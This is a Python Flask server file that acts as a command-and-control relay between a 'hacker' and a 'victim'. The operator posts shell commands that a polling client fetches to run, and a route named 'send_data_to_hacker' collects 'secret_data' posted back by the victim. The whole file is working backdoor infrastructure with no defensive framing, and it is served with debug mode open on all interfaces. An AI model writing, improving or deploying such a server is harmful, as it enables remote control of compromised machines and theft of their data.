
from flask import Flask, request, jsonify

app = Flask(__name__)

curr_cmd_to_exec = ''
fetched_data = ''

# Route for GET request
@app.route('/cmd_to_exec', methods=['GET'])
def send_cmd_to_exec():
    global curr_cmd_to_exec, fetched_data
    try:
        temp_cmd = curr_cmd_to_exec
        curr_cmd_to_exec = ''
        return f"{temp_cmd}"
    except Exception as e:
        print(e)
        pass

# Route for POST request
@app.route('/cmd_to_exec', methods=['POST'])
def get_cmd_to_exec():
    global curr_cmd_to_exec, fetched_data
    try:
        data = request.get_json()
        print(">>", data)
        curr_cmd_to_exec = data['cmd_to_exec']
        return jsonify(data), 200
    except Exception as e:
        print(e)
        return ''

# Route for GET request
@app.route('/data_from_victim', methods=['GET'])
def fetch_data_from_victim():
    global curr_cmd_to_exec, fetched_data
    try:
        print(">>>", fetched_data)
        return f"{fetched_data}"
    except Exception as e:
        print(e)
        return ''

# Route for POST request
@app.route('/data_from_victim', methods=['POST'])
def send_data_to_hacker():
    global curr_cmd_to_exec, fetched_data
    try:
        data = request.get_json()
        print("Main data", data)
        fetched_data = data['secret_data']
        return data, 200
    except Exception as e:
        print(e)
        return ''

if __name__ == '__main__':
    app.run(host = '0.0.0.0', port=5000, debug=True)

